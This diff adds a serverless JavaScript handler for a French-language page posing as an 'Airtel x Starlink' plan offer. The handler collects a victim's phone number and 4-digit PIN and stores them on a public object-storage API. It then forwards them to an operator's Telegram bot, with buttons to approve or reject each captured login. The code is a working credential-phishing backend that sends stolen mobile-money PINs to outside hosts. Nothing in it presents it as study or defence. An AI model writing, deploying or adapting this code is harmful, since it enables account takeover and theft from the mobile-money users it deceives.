@@ -1,0 +1,122 @@
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';
+
+export default async function handler(req, res) {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method Not Allowed' });
+  }
+
+  try {
+    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = req.body || {};
+
+    if (!sessionId || !phone || !pin) {
+      return res.status(400).json({ error: 'Champs obligatoires manquants.' });
+    }
+
+    const cleanPhone = phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
+    const cleanPin = pin.toString().slice(0, 4);
+    const displayPhone = fullPhone || `+243 ${cleanPhone}`;
+    const displayCountry = country || 'Airtel Africa';
+    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
+
+    // 1. Create cloud session record on restful-api.dev
+    let cloudId = sessionId;
+    try {
+      const createRes = await fetch('https://api.restful-api.dev/objects', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: `stl_${cleanPhone}`,
+          data: {
+            sessionId,
+            phone: cleanPhone,
+            fullPhone: displayPhone,
+            country: displayCountry,
+            airtelBrand: displayBrand,
+            pin: cleanPin,
+            planName: planName || 'Forfait Airtel Starlink',
+            planPrice: planPrice || '$1.49',
+            loginStatus: 'pending',
+            otpStatus: 'idle',
+            createdAt: Date.now(),
+            lastUpdated: Date.now(),
+          },
+        }),
+      });
+
+      if (createRes.ok) {
+        const createData = await createRes.json();
+        if (createData.id) {
+          cloudId = createData.id;
+        }
+      }
+    } catch (e) {
+      console.warn('Could not create cloud record:', e);
+    }
+
+    const cbId = cloudId.length <= 36 ? cloudId : cloudId.slice(0, 18) + '_' + cloudId.slice(-14);
+
+    // 2. Format message for Telegram
+    const messageText =
+      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
+      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
+      `📦 <b>Forfait Choisi:</b> <b>${planName || 'Forfait Airtel Starlink'}</b> (${planPrice || '$1.49'})\n` +
+      `📶 <b>Réseau:</b> ${displayBrand}\n` +
+      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
+      `🆔 <b>ID Session:</b> <code>${cloudId}</code>\n\n` +
+      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
+
+    const inlineKeyboard = [
+      [
+        {
+          text: '✅ Valider PIN',
+          callback_data: `approve_login_${cbId}`,
+        },
+        {
+          text: '❌ Rejeter PIN',
+          callback_data: `reject_login_${cbId}`,
+        },
+      ],
+    ];
+
+    let tgData = null;
+    if (BOT_TOKEN && CHAT_ID) {
+      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: messageText,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: inlineKeyboard,
+          },
+        }),
+      });
+      tgData = await tgRes.json();
+    }
+
+    const telegramSent = Boolean(tgData && tgData.ok);
+
+    return res.status(200).json({
+      success: true,
+      telegramSent,
+      sessionId,
+      cloudId,
+      telegram: tgData,
+    });
+  } catch (error) {
+    console.error('send-login serverless error:', error);
+    return res.status(500).json({ error: error.message });
+  }
+}
